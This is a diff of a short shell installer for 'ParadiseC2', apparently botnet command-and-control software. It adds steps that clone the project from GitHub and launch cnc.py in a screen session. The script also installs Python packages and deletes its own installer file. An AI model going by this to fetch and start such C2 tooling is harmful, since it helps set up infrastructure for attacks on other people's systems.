@@ -1,5 +1,9 @@
 clear
 echo "Installing required files for "ParadiseC2" 20% [==>-------]"
+sudo apt install git
+git clone https://github.com/d3fe4ted/ParadiseC2
+clear
+echo "Installing required files for "ParadiseC2" 20% [==>-------]"
 sudo apt install python3
 sudo apt install python2
 sudo apt install python
@@ -15,4 +19,5 @@ echo "Cleaning up"
 sleep 2
 rm -rf installation.sh
 clear
-python3 cnc.py
+cd ParadiseC2
+screen python3 cnc.py
